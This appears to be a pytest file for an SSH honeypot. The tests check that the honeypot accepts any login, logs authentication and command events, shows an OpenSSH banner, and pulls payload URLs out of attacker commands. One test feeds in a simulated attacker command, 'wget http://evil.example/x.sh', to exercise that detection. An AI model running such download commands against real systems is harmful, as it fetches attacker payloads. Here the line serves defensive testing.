import asyncio

import asyncssh

from bus import EventBus
from config import Settings
from sshd import SERVER_VERSION, hash_password, start_ssh_server


def _run(coro):
    return asyncio.run(coro)


async def _start():
    bus: EventBus = EventBus("raw")
    events: list = []

    async def sink(event) -> None:
        events.append(event)

    bus.subscribe(sink)
    await bus.start()
    server = await start_ssh_server(Settings(), bus, host="127.0.0.1", port=0)
    return bus, server, events


async def _stop(bus, server) -> None:
    server.close()
    await server.wait_closed()
    await bus.stop()


def test_hash_password_format():
    assert hash_password("password") == (
        "sha256:"
        "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
    )


def test_server_accepts_any_credentials_and_serves_commands():
    async def scenario():
        bus, server, events = await _start()
        try:
            async with asyncssh.connect(
                "127.0.0.1",
                port=server.get_port(),
                username="root",
                password="hunter2",
                known_hosts=None,
            ) as conn:
                result = await conn.run("whoami", check=False)
                assert "root" in (result.stdout or "")
        finally:
            await _stop(bus, server)
        return events

    events = _run(scenario())
    kinds = [event.additional_info["event_kind"] for event in events]

    assert kinds.count("ssh_handshake") == 1
    assert "auth" in kinds
    assert "command" in kinds

    handshake = next(
        event
        for event in events
        if event.additional_info["event_kind"] == "ssh_handshake"
    )
    assert handshake.additional_info["client_version"]

    auth = next(
        event for event in events if event.additional_info["event_kind"] == "auth"
    )
    assert auth.login_info is not None
    assert auth.login_info.username == "root"
    assert auth.login_info.password_hash == hash_password("hunter2")

    command = next(
        event for event in events if event.additional_info["event_kind"] == "command"
    )
    assert command.command == "whoami"
    assert command.login_info == auth.login_info


def test_interactive_shell_accepts_commands():
    async def scenario():
        bus, server, events = await _start()
        try:
            async with asyncssh.connect(
                "127.0.0.1",
                port=server.get_port(),
                username="root",
                password="hunter2",
                known_hosts=None,
            ) as conn:
                proc = await conn.create_process(term_type="xterm")
                prompt = await asyncio.wait_for(proc.stdout.readuntil("# "), 5)
                assert "root@honeybadger" in prompt

                proc.stdin.write(
                    "pwd\nwhoami\nwget http://evil.example/x.sh\nexit\n"
                )
                output = await asyncio.wait_for(proc.stdout.read(), 5)
                await proc.wait()
        finally:
            await _stop(bus, server)
        return output, events

    output, events = _run(scenario())
    assert "/root" in output
    assert "root@honeybadger" in output

    commands = [
        event
        for event in events
        if event.additional_info["event_kind"] == "command"
    ]
    names = [event.command for event in commands]
    assert "pwd" in names
    assert "whoami" in names

    wget = next(event for event in commands if event.command.startswith("wget"))
    assert wget.payload_url == "http://evil.example/x.sh"


def test_server_identification_string_is_openssh():
    async def scenario():
        bus, server, events = await _start()
        try:
            reader, writer = await asyncio.open_connection(
                "127.0.0.1", server.get_port()
            )
            try:
                line = await asyncio.wait_for(reader.readline(), timeout=5)
            finally:
                writer.close()
                try:
                    await writer.wait_closed()
                except OSError:
                    pass
            return line
        finally:
            await _stop(bus, server)

    banner = _run(scenario()).decode("ascii").strip()
    assert banner == SERVER_VERSION
    assert banner.startswith("SSH-2.0-OpenSSH_")
